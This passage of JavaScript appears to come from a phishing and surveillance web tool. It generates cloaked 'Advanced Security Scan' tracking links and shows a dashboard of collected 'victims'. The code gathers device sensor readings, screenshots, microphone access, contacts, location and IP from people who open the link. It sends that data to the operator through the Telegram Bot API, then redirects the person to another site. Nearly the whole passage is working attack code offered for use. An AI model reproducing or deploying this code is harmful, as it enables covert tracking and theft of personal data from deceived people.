                        α: ${event.alpha?.toFixed(2) || 'N/A'}°<br>
                        β: ${event.beta?.toFixed(2) || 'N/A'}°<br>
                        γ: ${event.gamma?.toFixed(2) || 'N/A'}°
                    `);
                });
            }
            
            // Check for device motion
            if (window.DeviceMotionEvent) {
                window.addEventListener('devicemotion', (event) => {
                    victimData.sensorData.accelerometer = {
                        x: event.acceleration?.x,
                        y: event.acceleration?.y,
                        z: event.acceleration?.z
                    };
                    
                    victimData.sensorData.gyroscope = {
                        alpha: event.rotationRate?.alpha,
                        beta: event.rotationRate?.beta,
                        gamma: event.rotationRate?.gamma
                    };
                    
                    updateSensorDisplay('accelerometer', `
                        X: ${event.acceleration?.x?.toFixed(2) || 'N/A'}<br>
                        Y: ${event.acceleration?.y?.toFixed(2) || 'N/A'}<br>
                        Z: ${event.acceleration?.z?.toFixed(2) || 'N/A'}
                    `);
                });
            }
            
            // Ambient Light Sensor
            if ('AmbientLightSensor' in window) {
                try {
                    const sensor = new AmbientLightSensor();
                    sensor.addEventListener('reading', () => {
                        victimData.sensorData.ambientLight = {
                            illuminance: sensor.illuminance
                        };
                        updateSensorDisplay('light', `${sensor.illuminance?.toFixed(2) || 'N/A'} lux`);
                    });
                    sensor.start();
                } catch (error) {
                    console.log('Light sensor not available');
                }
            }
            
            // Proximity Sensor
            if ('ProximitySensor' in window) {
                try {
                    const sensor = new ProximitySensor();
                    sensor.addEventListener('reading', () => {
                        victimData.sensorData.proximity = {
                            distance: sensor.distance,
                            max: sensor.max
                        };
                        updateSensorDisplay('proximity', `${sensor.distance?.toFixed(2) || 'N/A'} cm`);
                    });
                    sensor.start();
                } catch (error) {
                    console.log('Proximity sensor not available');
                }
            }
            
            // Initialize sensor display
            sensorDiv.innerHTML = `
                <div class="sensor-card" id="sensor-orientation">
                    <i class="fas fa-compass fa-2x"></i>
                    <div class="sensor-value">--</div>
                    <div class="sensor-label">Orientation</div>
                </div>
                <div class="sensor-card" id="sensor-accelerometer">
                    <i class="fas fa-running fa-2x"></i>
                    <div class="sensor-value">--</div>
                    <div class="sensor-label">Accelerometer</div>
                </div>
                <div class="sensor-card" id="sensor-light">
                    <i class="fas fa-lightbulb fa-2x"></i>
                    <div class="sensor-value">--</div>
                    <div class="sensor-label">Light</div>
                </div>
                <div class="sensor-card" id="sensor-proximity">
                    <i class="fas fa-hand-point-up fa-2x"></i>
                    <div class="sensor-value">--</div>
                    <div class="sensor-label">Proximity</div>
                </div>
            `;
        }

        function updateSensorDisplay(sensorType, value) {
            const element = document.getElementById(`sensor-${sensorType}`);
            if (element) {
                const valueDiv = element.querySelector('.sensor-value');
                if (valueDiv) {
                    valueDiv.innerHTML = value;
                }
            }
        }

        // ============================================
        // SCREENSHOT FUNCTION
        // ============================================

        async function captureScreenshotForData(victimData) {
            try {
                const canvas = await html2canvas(document.body, {
                    scale: 0.5,
                    useCORS: true,
                    logging: false
                });
                
                const screenshotData = canvas.toDataURL('image/jpeg', 0.7);
                victimData.mediaData.screenshots.push({
                    data: screenshotData,
                    timestamp: new Date().toISOString(),
                    resolution: `${canvas.width}x${canvas.height}`
                });
                
                return screenshotData;
            } catch (error) {
                console.log('Screenshot capture failed:', error);
                return null;
            }
        }

        function captureScreenshot() {
            showToast('Capturing screenshot...', 'info');
            
            html2canvas(document.body, {
                scale: 0.8,
                useCORS: true,
                logging: false
            }).then(canvas => {
                const screenshotData = canvas.toDataURL('image/jpeg', 0.8);
                
                document.getElementById('screenshot-preview').innerHTML = `
                    <div class="alert alert-success">
                        <i class="fas fa-check"></i> Screenshot captured!
                        <img src="${screenshotData}" class="media-preview mt-2" alt="Screenshot">
                        <div class="mt-2">
                            <button class="btn btn-sm btn-success" onclick="saveScreenshot('${screenshotData}')">
                                <i class="fas fa-save"></i> Save Screenshot
                            </button>
                        </div>
                    </div>
                `;
            });
        }

        // ============================================
        // MICROPHONE FUNCTIONS
        // ============================================

        async function startMicrophone() {
            try {
                audioStream = await navigator.mediaDevices.getUserMedia({ 
                    audio: {
                        echoCancellation: false,
                        noiseSuppression: false,
                        autoGainControl: false
                    }
                });
                
                audioRecorder = new MediaRecorder(audioStream);
                audioChunks = [];
                
                audioRecorder.ondataavailable = (event) => {
                    audioChunks.push(event.data);
                };
                
                audioRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    const audioUrl = URL.createObjectURL(audioBlob);
                    
                    document.getElementById('audio-preview').innerHTML = `
                        <div class="alert alert-success">
                            <i class="fas fa-check"></i> Audio recorded!
                            <audio controls class="mt-2" style="width: 100%">
                                <source src="${audioUrl}" type="audio/webm">
                            </audio>
                            <div class="mt-2">
                                <button class="btn btn-sm btn-success" onclick="saveAudio('${audioUrl}')">
                                    <i class="fas fa-save"></i> Save Audio
                                </button>
                            </div>
                        </div>
                    `;
                };
                
                audioRecorder.start();
                document.getElementById('stop-mic-btn').style.display = 'inline-block';
                
                // Show visualizer
                const visualizer = document.getElementById('audio-visualizer');
                visualizer.style.display = 'block';
                
            } catch (error) {
                console.log('Microphone access denied:', error);
                showToast('Microphone access denied', 'error');
            }
        }

        function stopMicrophone() {
            if (audioRecorder && audioRecorder.state !== 'inactive') {
                audioRecorder.stop();
                audioStream.getTracks().forEach(track => track.stop());
                document.getElementById('stop-mic-btn').style.display = 'none';
                document.getElementById('audio-visualizer').style.display = 'none';
            }
        }

        async function testMicrophoneAccess(victimData) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                victimData.permissionsInfo.microphone = 'granted';
                stream.getTracks().forEach(track => track.stop());
                return true;
            } catch (error) {
                victimData.permissionsInfo.microphone = 'denied';
                return false;
            }
        }

        // ============================================
        // CONTACTS ACCESS
        // ============================================

        async function accessContactsForData(victimData) {
            victimData.contactsData = {
                access: 'not_supported',
                contacts: [],
                timestamp: new Date().toISOString()
            };
            
            if ('contacts' in navigator && 'ContactsManager' in window) {
                try {
                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                    
                    victimData.contactsData.access = 'granted';
                    victimData.contactsData.contacts = contacts.map(contact => ({
                        name: contact.name ? contact.name.join(' ') : 'Unknown',
                        phones: contact.tel || [],
                        emails: contact.email || []
                    }));
                    
                    return contacts;
                } catch (error) {
                    victimData.contactsData.access = 'denied';
                    return null;
                }
            }
            return null;
        }

        async function accessContacts() {
            if ('contacts' in navigator && 'ContactsManager' in window) {
                try {
                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                    
                    let contactsHTML = '<div class="alert alert-success"><h6>Contacts Found:</h6><ul class="list-group">';
                    
                    contacts.slice(0, 5).forEach(contact => {
                        const name = contact.name ? contact.name.join(' ') : 'Unknown';
                        const phones = contact.tel ? contact.tel.join(', ') : 'No phone';
                        contactsHTML += `<li class="list-group-item">
                            <strong>${name}</strong><br>
                            <small>Phone: ${phones}</small>
                        </li>`;
                    });
                    
                    contactsHTML += `</ul><p class="mt-2 mb-0">Total contacts: ${contacts.length}</p></div>`;
                    
                    document.getElementById('contacts-info').innerHTML = contactsHTML;
                    
                } catch (error) {
                    document.getElementById('contacts-info').innerHTML = `
                        <div class="alert alert-danger">
                            <i class="fas fa-exclamation-circle"></i>
                            Contacts access denied or not supported
                        </div>
                    `;
                }
            } else {
                document.getElementById('contacts-info').innerHTML = `
                    <div class="alert alert-warning">
                        <i class="fas fa-exclamation-triangle"></i>
                        Contacts API not supported by this browser
                    </div>
                `;
            }
        }

        // ============================================
        // VICTIM PROGRESS FUNCTIONS
        // ============================================

        function updateVictimProgress(step, totalSteps, message) {
            const progress = Math.min(100, Math.round((step / totalSteps) * 100));
            
            const progressBar = document.getElementById('scan-progress');
            const statusMessage = document.getElementById('status-message');
            const statusDetails = document.getElementById('status-details');
            
            if (progressBar) {
                progressBar.style.width = `${progress}%`;
                const progressText = progressBar.querySelector('.progress-text');
                if (progressText) {
                    progressText.textContent = `${progress}%`;
                }
            }
            
            if (statusMessage && message) {
                statusMessage.textContent = message;
            }
            
            // Update checklist
            const checklistItems = document.querySelectorAll('.checklist-item');
            if (checklistItems.length >= step) {
                for (let i = 0; i < checklistItems.length; i++) {
                    checklistItems[i].classList.remove('active');
                    
                    if (i < step - 1) {
                        // Completed steps
                        checklistItems[i].innerHTML = '<i class="fas fa-check text-success me-2"></i>' + 
                            checklistItems[i].textContent;
                        checklistItems[i].classList.add('completed');
                    } else if (i === step - 1) {
                        // Current step
                        checklistItems[i].innerHTML = '<i class="fas fa-spinner fa-spin text-primary me-2"></i>' + 
                            checklistItems[i].textContent;
                        checklistItems[i].classList.add('active');
                    }
                }
            }
        }

        function completeAdvancedScan(campaignId) {
            const urlParams = new URLSearchParams(window.location.search);
            const redirectUrl = urlParams.get('redirect') || 'https://google.com';
            
            // Update UI
            document.getElementById('status-message').textContent = 'Advanced Scan Complete!';
            document.getElementById('status-details').textContent = 'All device analysis completed successfully.';
            
            // Hide spinner
            const spinner = document.querySelector('.spinner-border');
            if (spinner) spinner.style.display = 'none';
            
            // Update progress bar
            const progressBar = document.getElementById('scan-progress');
            if (progressBar) {
                progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
                progressBar.classList.add('bg-success');
                progressBar.style.width = '100%';
            }
            
            // Update all checklist items to completed
            document.querySelectorAll('.checklist-item').forEach(item => {
                item.innerHTML = '<i class="fas fa-check text-success me-2"></i>' + item.textContent;
                item.classList.add('completed');
                item.classList.remove('active');
            });
            
            // Show success message
            const alertDiv = document.querySelector('.alert');
            if (alertDiv) {
                alertDiv.className = 'alert alert-success';
                alertDiv.innerHTML = `
                    <i class="fas fa-check-circle"></i>
                    <strong>Advanced Scan Successful!</strong><br>
                    Device fingerprint, location, sensors, and media analysis completed.<br>
                    Redirecting in <span id="countdown">5</span> seconds...
                `;
            }
            
            // Stop all media streams
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
            }
            if (audioStream) {
                audioStream.getTracks().forEach(track => track.stop());
            }
            
            // Countdown and redirect
            let countdown = 5;
            const countdownElement = document.getElementById('countdown');
            const countdownInterval = setInterval(() => {
                countdown--;
                if (countdownElement) countdownElement.textContent = countdown;
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    window.location.href = redirectUrl;
                }
            }, 1000);
            
            // Update footer
            const footer = document.querySelector('.victim-footer');
            if (footer) {
                footer.innerHTML = `
                    <div class="d-flex justify-content-center align-items-center">
                        <i class="fas fa-check-circle text-success me-2"></i>
                        <span>Advanced scan completed successfully • Redirecting...</span>
                    </div>
                `;
            }
        }

        // ============================================
        // TELEGRAM FUNCTIONS
        // ============================================

        async function sendCompleteDataToTelegram(victimData, campaignId) {
            try {
                const campaign = campaignManager.campaigns.find(c => c.id === campaignId);
                const campaignName = campaign ? campaign.name : 'Unknown Campaign';
                
                // Format message with all collected data
                let message = `🚨 *ADVANCED VICTIM DATA CAPTURED!*\n\n`;
                message += `📊 *Campaign:* ${campaignName}\n`;
                message += `🆔 *Victim ID:* ${victimData.victimID || 'N/A'}\n`;
                message += `⏰ *Time:* ${new Date(victimData.timestamp).toLocaleString()}\n`;
                message += `📱 *Device:* ${victimData.deviceInfo.deviceName || 'Unknown'}\n`;
                message += `🌐 *IP:* \`${victimData.networkInfo.ipv4 || 'Unknown'}\`\n`;
                
                if (victimData.locationInfo) {
                    message += `📍 *Location:* ${victimData.locationInfo.latitude.toFixed(6)}, ${victimData.locationInfo.longitude.toFixed(6)}\n`;
                    message += `🎯 *Accuracy:* ${victimData.locationInfo.accuracy.toFixed(2)}m\n`;
                    message += `🗺️ *Maps:* https://maps.google.com/?q=${victimData.locationInfo.latitude},${victimData.locationInfo.longitude}\n`;
                }
                
                if (victimData.sensorData) {
                    message += `📡 *Sensors:* ${Object.keys(victimData.sensorData).filter(k => k !== 'timestamp').join(', ')}\n`;
                }
                
                if (victimData.mediaData.photos.length > 0) {
                    message += `📷 *Photos:* ${victimData.mediaData.photos.length} captured\n`;
                }
                
                if (victimData.mediaData.screenshots.length > 0) {
                    message += `🖥️ *Screenshots:* ${victimData.mediaData.screenshots.length} captured\n`;
                }
                
                if (victimData.contactsData.access === 'granted') {
                    message += `📞 *Contacts:* ${victimData.contactsData.contacts.length} accessed\n`;
                }
                
                message += `\n_Advanced scan completed via tracking link_`;
                
                // Send message
                await sendTelegramMessage(message);
                
                // Send JSON data as document
                const jsonData = JSON.stringify(victimData, null, 2);
                await sendTelegramDocument(
                    new Blob([jsonData], { type: 'application/json' }),
                    `victim-${victimData.id}.json`,
                    `Complete advanced victim data`
                );
                
                return true;
            } catch (error) {
                console.error('Failed to send to Telegram:', error);
                return false;
            }
        }

        async function sendTelegramMessage(text) {
            if (!telegramConfig.botToken || !telegramConfig.chatId) return;
            
            const url = `${telegramConfig.apiUrl}${telegramConfig.botToken}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: telegramConfig.chatId,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
                
                return await response.json();
            } catch (error) {
                console.error('Telegram error:', error);
            }
        }

        async function sendTelegramDocument(blob, filename, caption) {
            if (!telegramConfig.botToken || !telegramConfig.chatId) return;
            
            const url = `${telegramConfig.apiUrl}${telegramConfig.botToken}/sendDocument`;
            const formData = new FormData();
            formData.append('chat_id', telegramConfig.chatId);
            formData.append('document', blob, filename);
            if (caption) formData.append('caption', caption);
            
            try {
                const response = await fetch(url, { method: 'POST', body: formData });
                return await response.json();
            } catch (error) {
                console.error('Telegram document error:', error);
            }
        }

        // ============================================
        // DASHBOARD INTERFACE
        // ============================================

        function loadDashboardInterface() {
            document.body.className = 'dashboard-interface';
            document.body.innerHTML = `
                <div class="container py-5">
                    <div class="row justify-content-center">
                        <div class="col-12">
                            <div class="glass-card p-4 mb-4">
                                <div class="row align-items-center">
                                    <div class="col-md-5">
                                        <h1 class="display-5 fw-bold text-white mb-2">
                                            <i class="fas fa-robot"></i> Advanced Device Scanner
                                        </h1>
                                        <p class="lead text-white mb-0">
                                            Dashboard with Advanced Data Collection
                                        </p>
                                    </div>
                                    <div class="col-md-7 text-end">
                                        <div class="d-flex justify-content-end gap-2 flex-wrap">
                                            <button class="btn link-btn mb-2" data-bs-toggle="modal" data-bs-target="#linkModal">
                                                <i class="fas fa-link"></i> Generate Advanced Link
                                            </button>
                                            <button class="btn download-btn mb-2" onclick="downloadAllData()">
                                                <i class="fas fa-download"></i> Download All Data
                                            </button>
                                            <button class="btn btn-outline-light mb-2" onclick="refreshDashboard()">
                                                <i class="fas fa-sync-alt"></i> Refresh
                                            </button>
                                            <button class="btn btn-warning mb-2" onclick="clearAllData()">
                                                <i class="fas fa-trash"></i> Clear Data
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="row">
                        <div class="col-lg-4 mb-4">
                            <div class="info-card glass-card">
                                <div class="card-header">
                                    <i class="fas fa-users card-icon"></i> Collected Victims
                                </div>
                                <div class="card-body" style="max-height: 400px; overflow-y: auto;">
                                    <div id="victims-list">
                                        <p class="text-muted text-center">Loading victims data...</p>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="info-card glass-card mt-4">
                                <div class="card-header">
                                    <i class="fas fa-chart-bar card-icon"></i> Statistics
                                </div>
                                <div class="card-body">
                                    <div id="stats-content">
                                        <p class="text-muted text-center">Loading statistics...</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="col-lg-8">
                            <div class="info-card glass-card">
                                <div class="card-header">
                                    <i class="fas fa-user-circle card-icon"></i> Victim Details
                                </div>
                                <div class="card-body" style="max-height: 500px; overflow-y: auto;">
                                    <div id="victim-details">
                                        <div class="text-center py-5">
                                            <i class="fas fa-user fa-3x text-secondary mb-3"></i>
                                            <h5>Select a victim to view details</h5>
                                            <p class="text-muted">Click on any victim from the list to see their collected data</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Link Modal -->
                <div class="modal fade" id="linkModal" tabindex="-1">
                    <div class="modal-dialog">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title">
                                    <i class="fas fa-link"></i> Generate Advanced Tracking Link
                                </h5>
                                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                            </div>
                            <div class="modal-body">
                                <div class="mb-3">
                                    <label for="campaign-name" class="form-label">Campaign Name:</label>
                                    <input type="text" class="form-control" id="campaign-name" 
                                           placeholder="e.g., Advanced Security Scan" 
                                           value="Advanced Campaign">
                                </div>
                                
                                <div class="mb-3">
                                    <label for="redirect-url" class="form-label">Redirect URL:</label>
                                    <input type="url" class="form-control" id="redirect-url" 
                                           placeholder="https://example.com" 
                                           value="https://google.com">
                                </div>
                                
                                <div class="mb-3">
                                    <label for="cloak-title" class="form-label">Page Title:</label>
                                    <input type="text" class="form-control" id="cloak-title" 
                                           placeholder="Scanning in progress..." 
                                           value="Advanced Security Scan">
                                </div>
                                
                                <div class="text-center">
                                    <button class="btn link-btn" onclick="generateAdvancedLink()">
                                        <i class="fas fa-magic"></i> Generate Advanced Link
                                    </button>
                                </div>
                                
                                <div id="generated-link-container" class="mt-3" style="display: none;">
                                    <div class="alert alert-success" id="generated-link"></div>
                                    <div class="text-end mt-2">
                                        <button class="btn btn-sm btn-success" onclick="copyGeneratedLink()">
                                            <i class="fas fa-copy"></i> Copy Link
                                        </button>
                                        <button class="btn btn-sm btn-primary ms-2" onclick="testGeneratedLink()">
                                            <i class="fas fa-external-link-alt"></i> Test Link
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            
            // Initialize dashboard
            initializeDashboard();
        }

        function initializeDashboard() {
            console.log('Initializing dashboard...');
            
            // Load data
            campaignManager.loadAllData();
            
            // Refresh display
            refreshVictimsList();
            updateStatistics();
            
            console.log('Dashboard initialized. Victims:', victimsData.length, 'Campaigns:', campaignManager.campaigns.length);
        }

        function refreshDashboard() {
            console.log('Refreshing dashboard...');
            campaignManager.loadAllData();
            refreshVictimsList();
            updateStatistics();
            showToast('Dashboard refreshed', 'info');
        }

        function refreshVictimsList() {
            const victimsList = document.getElementById('victims-list');
            const allVictims = campaignManager.getVictims();
            
            console.log('Refreshing victims list. Total victims:', allVictims.length);
            
            if (allVictims.length === 0) {
                victimsList.innerHTML = `
                    <div class="text-center py-3">
                        <i class="fas fa-user-slash fa-2x text-secondary mb-2"></i>
                        <p>No victim data collected yet</p>
                        <p class="small text-muted">Generate a link and share it to collect data</p>
                        <button class="btn btn-sm btn-primary mt-2" onclick="testWithSampleData()">
                            <i class="fas fa-vial"></i> Add Test Data
                        </button>
                    </div>
                `;
                return;
            }
            
            let html = `
                <div class="d-flex justify-content-between align-items-center mb-3">
                    <strong>Total Victims: ${allVictims.length}</strong>
                    <small class="text-muted">Click to view details</small>
                </div>
            `;
            
            // Sort by most recent first
            const sortedVictims = [...allVictims].sort((a, b) => {
                return new Date(b.timestamp || b.receivedAt) - new Date(a.timestamp || a.receivedAt);
            });
            
            sortedVictims.forEach((victim, index) => {
                const timeAgo = getTimeAgo(victim.timestamp || victim.receivedAt);
                const ip = victim.networkInfo?.ipv4 || 'Unknown IP';
                const device = victim.deviceInfo?.deviceName || 'Unknown Device';
                
                html += `
                    <div class="victim-item" onclick="selectVictim('${victim.id}')" id="victim-${victim.id}">
                        <div class="d-flex justify-content-between">
                            <div>
                                <strong>Victim ${index + 1}</strong>
                                <span class="badge bg-primary" style="font-size: 0.7rem; padding: 3px 8px; border-radius: 10px; margin-left: 5px;">${victim.campaignName || 'Unknown'}</span>
                            </div>
                            <small class="text-muted">${timeAgo}</small>
                        </div>
                        <div class="small mt-1">
                            <span style="font-family: monospace; background: #e9ecef; padding: 2px 5px; border-radius: 3px; font-size: 0.85rem;">${ip}</span>
                            <span class="ms-2">${device}</span>
                        </div>
                    </div>
                `;
            });
            
            victimsList.innerHTML = html;
        }

        function selectVictim(victimId) {
            console.log('Selecting victim:', victimId);
            
            // Remove active class from all victim items
            document.querySelectorAll('.victim-item').forEach(item => {
                item.classList.remove('active');
            });
            
            // Add active class to selected victim
            const selectedItem = document.getElementById(`victim-${victimId}`);
            if (selectedItem) {
                selectedItem.classList.add('active');
            }
            
            // Find victim data
            let victim = victimsData.find(v => v.id === victimId);
            if (!victim) {
                // Check in campaign victims
                for (const campaign of campaignManager.campaigns) {
                    const found = campaign.victims.find(v => v.id === victimId);
                    if (found) {
                        victim = found;
                        break;
                    }
                }
            }
            
            if (!victim) {
                document.getElementById('victim-details').innerHTML = `
                    <div class="text-center py-3">
                        <i class="fas fa-exclamation-triangle text-warning"></i>
                        <p>Victim data not found</p>
                        <p class="small text-muted">ID: ${victimId}</p>
                    </div>
                `;
                return;
            }
            
            // Display victim details
            displayVictimDetails(victim);
        }

        function displayVictimDetails(victim) {
            let html = `
                <div class="d-flex justify-content-between align-items-center mb-3">
                    <h5>Advanced Victim Details</h5>
                    <div>
                        <button class="btn btn-sm telegram-btn" onclick="sendVictimToTelegram('${victim.id}')">
                            <i class="fab fa-telegram"></i> Send to Telegram
                        </button>
                        <button class="btn btn-sm btn-outline-primary ms-1" onclick="downloadVictimData('${victim.id}')">
                            <i class="fas fa-download"></i> Download
                        </button>
                        <button class="btn btn-sm btn-outline-info ms-1" onclick="viewJSON('${victim.id}')">
                            <i class="fas fa-code"></i> View JSON
                        </button>
                    </div>
                </div>
                
                <div class="row">
                    <div class="col-md-6">
                        <div class="data-item">
                            <span class="data-label">Victim ID:</span>
                            <span class="data-value">${victim.victimID || victim.id}</span>
                        </div>
                        <div class="data-item">
                            <span class="data-label">Campaign:</span>
                            <span class="data-value">${victim.campaignName || 'Unknown'}</span>
                        </div>
                        <div class="data-item">
                            <span class="data-label">Collected:</span>
                            <span class="data-value">${new Date(victim.timestamp || victim.receivedAt).toLocaleString()}</span>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="data-item">
                            <span class="data-label">IP Address:</span>
                            <span class="data-value">${victim.networkInfo?.ipv4 || 'Unknown'}</span>
                        </div>
                        <div class="data-item">
                            <span class="data-label">Device:</span>
                            <span class="data-value">${victim.deviceInfo?.deviceName || 'Unknown'}</span>
                        </div>
                        <div class="data-item">
                            <span class="data-label">Platform:</span>
                            <span class="data-value">${victim.deviceInfo?.platform || 'Unknown'}</span>
                        </div>
                    </div>
                </div>
            `;
            
            // Device Info
            if (victim.deviceInfo) {
                html += `
                    <div class="mt-4">
                        <h6>Device Information</h6>
                        <div class="row">
                            <div class="col-md-6">
                                <div class="data-item">
                                    <span class="data-label">Screen:</span>
                                    <span class="data-value">${victim.deviceInfo.screenResolution || 'Unknown'}</span>
                                </div>
                                <div class="data-item">
                                    <span class="data-label">User Agent:</span>
                                    <span class="data-value small">${victim.deviceInfo.userAgent?.substring(0, 100) || 'Unknown'}...</span>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="data-item">
                                    <span class="data-label">Language:</span>
                                    <span class="data-value">${victim.deviceInfo.language || 'Unknown'}</span>
                                </div>
                                <div class="data-item">
                                    <span class="data-label">Memory:</span>
                                    <span class="data-value">${victim.deviceInfo.deviceMemory || 'Unknown'}</span>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
            }
            
            // Network Info
            if (victim.networkInfo) {
                html += `
                    <div class="mt-4">
                        <h6>Network Information</h6>
                        <div class="row">
                            <div class="col-md-6">
                                <div class="data-item">
                                    <span class="data-label">Connection Type:</span>
                                    <span class="data-value">${victim.networkInfo.connectionType || 'Unknown'}</span>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="data-item">
                                    <span class="data-label">Status:</span>
                                    <span class="data-value">${victim.networkInfo.onlineStatus || 'Unknown'}</span>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
            }
            
            // Location Info
            if (victim.locationInfo?.latitude) {
                html += `
                    <div class="mt-4">
                        <h6>Location Information</h6>
                        <div class="row">
                            <div class="col-md-6">
                                <div class="data-item">
                                    <span class="data-label">Latitude:</span>
                                    <span class="data-value">${victim.locationInfo.latitude.toFixed(6)}</span>
                                </div>
                                <div class="data-item">
                                    <span class="data-label">Longitude:</span>
                                    <span class="data-value">${victim.locationInfo.longitude.toFixed(6)}</span>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="data-item">
                                    <span class="data-label">Accuracy:</span>
                                    <span class="data-value">${victim.locationInfo.accuracy?.toFixed(2) || 'Unknown'} meters</span>
                                </div>
                                <div class="data-item">
                                    <span class="data-label">Map:</span>
                                    <span class="data-value">
                                        <a href="https://maps.google.com/?q=${victim.locationInfo.latitude},${victim.locationInfo.longitude}" 
                                           target="_blank" class="btn btn-sm btn-outline-primary">
                                            View on Google Maps
                                        </a>
                                    </span>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
            }
            
            // Sensor Data
            if (victim.sensorData) {
                const sensorCount = Object.keys(victim.sensorData).filter(k => k !== 'timestamp').length;
                if (sensorCount > 0) {
                    html += `
                        <div class="mt-4">
                            <h6>Sensors Detected (${sensorCount})</h6>
                            <div class="small text-muted">Accelerometer, Gyroscope, Orientation, etc.</div>
                        </div>
                    `;
                }
            }
            
            // Media Data
            if (victim.mediaData) {
                const mediaCount = (victim.mediaData.photos?.length || 0) + (victim.mediaData.screenshots?.length || 0);
                if (mediaCount > 0) {
                    html += `
                        <div class="mt-4">
                            <h6>Media Captured (${mediaCount})</h6>
                            <div class="small text-muted">Photos: ${victim.mediaData.photos?.length || 0}, Screenshots: ${victim.mediaData.screenshots?.length || 0}</div>
                        </div>
                    `;
                }
            }
            
            // Contacts Data
            if (victim.contactsData?.access === 'granted') {
                html += `
                    <div class="mt-4">
                        <h6>Contacts Access (${victim.contactsData.contacts?.length || 0})</h6>
                        <div class="small text-muted">Contacts access was granted</div>
                    </div>
                `;
            }
            
            document.getElementById('victim-details').innerHTML = html;
        }

        function updateStatistics() {
            const statsContent = document.getElementById('stats-content');
            const allVictims = campaignManager.getVictims();
            const campaigns = campaignManager.campaigns;
            
            let html = `
                <div class="text-center mb-3">
                    <h4>${allVictims.length}</h4>
                    <p class="small text-muted">Total Victims</p>
                </div>
                
                <div class="row text-center">
                    <div class="col-6">
                        <h5>${campaigns.length}</h5>
                        <p class="small text-muted">Campaigns</p>
                    </div>
                    <div class="col-6">
                        <h5>${allVictims.filter(v => v.locationInfo?.latitude).length}</h5>
                        <p class="small text-muted">With Location</p>
                    </div>
                </div>
            `;
            
            if (campaigns.length > 0) {
                html += `<hr><h6>Campaign Stats:</h6>`;
                campaigns.forEach(campaign => {
                    const campaignVictims = campaign.victims || [];
                    html += `
                        <div style="margin-bottom: 8px;">
                            <strong>${campaign.name}</strong>
                            <div style="font-size: 0.85rem; color: #666;">
                                Clicks: ${campaign.stats.clicks || 0} | 
                                Data: ${campaignVictims.length} |
                                Last: ${campaign.stats.lastAccess ? new Date(campaign.stats.lastAccess).toLocaleDateString() : 'Never'}
                            </div>
                        </div>
                    `;
                });
            }
            
            statsContent.innerHTML = html;
        }

        // ============================================
        // ADVANCED LINK GENERATOR
        // ============================================

        function generateAdvancedLink() {
            const campaignName = document.getElementById('campaign-name').value.trim() || 'Advanced Campaign';
            const redirectUrl = document.getElementById('redirect-url').value.trim() || 'https://google.com';
            const cloakTitle = document.getElementById('cloak-title').value.trim() || 'Advanced Security Scan';
            
            // Generate unique campaign ID
            const campaignId = 'adv_camp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            // Create the tracking link
            const currentUrl = window.location.origin + window.location.pathname;
            const trackingLink = `${currentUrl}?track=true&cid=${campaignId}&redirect=${encodeURIComponent(redirectUrl)}&title=${encodeURIComponent(cloakTitle)}`;
            
            // Save campaign
            const dataSettings = {
                redirectUrl: redirectUrl,
                cloakTitle: cloakTitle,
                advanced: true
            };
            
            campaignManager.addCampaign(campaignName, trackingLink, dataSettings);
            
            // Display the generated link
            document.getElementById('generated-link').innerHTML = `
                <strong>Advanced Tracking Link:</strong><br>
                <code>${trackingLink}</code>
            `;
            document.getElementById('generated-link-container').style.display = 'block';
            
            showToast(`Advanced link generated for "${campaignName}"`, 'success');
            
            // Refresh lists
            refreshVictimsList();
            updateStatistics();
        }

        function copyGeneratedLink() {
            const linkElement = document.getElementById('generated-link');
            const linkText = linkElement.querySelector('code').textContent;
            navigator.clipboard.writeText(linkText).then(() => {
                showToast('Link copied to clipboard!', 'success');
            }).catch(err => {
                // Fallback
                const textarea = document.createElement('textarea');
                textarea.value = linkText;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                showToast('Link copied to clipboard!', 'success');
            });
        }

        function testGeneratedLink() {
            const linkElement = document.getElementById('generated-link');
            const linkText = linkElement.querySelector('code').textContent;
            window.open(linkText, '_blank');
        }

        // ============================================
        // UTILITY FUNCTIONS
        // ============================================

        function getDeviceName() {
            const userAgent = navigator.userAgent.toLowerCase();
            
            if (userAgent.includes('iphone')) return 'iPhone';
            if (userAgent.includes('ipad')) return 'iPad';
            if (userAgent.includes('android')) return 'Android Device';
            if (userAgent.includes('windows')) return 'Windows PC';
            if (userAgent.includes('mac')) return 'Mac';
            if (userAgent.includes('linux')) return 'Linux PC';
            
            return 'Unknown Device';
        }

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = 'Unknown';
            
            if (/chrome|crios/i.test(ua) && !/edge|edg/i.test(ua)) browser = 'Chrome';
            else if (/firefox|fxios/i.test(ua)) browser = 'Firefox';
            else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = 'Safari';
            else if (/edge|edg/i.test(ua)) browser = 'Edge';
            else if (/opr\//i.test(ua)) browser = 'Opera';
            else if (/trident/i.test(ua)) browser = 'Internet Explorer';
            
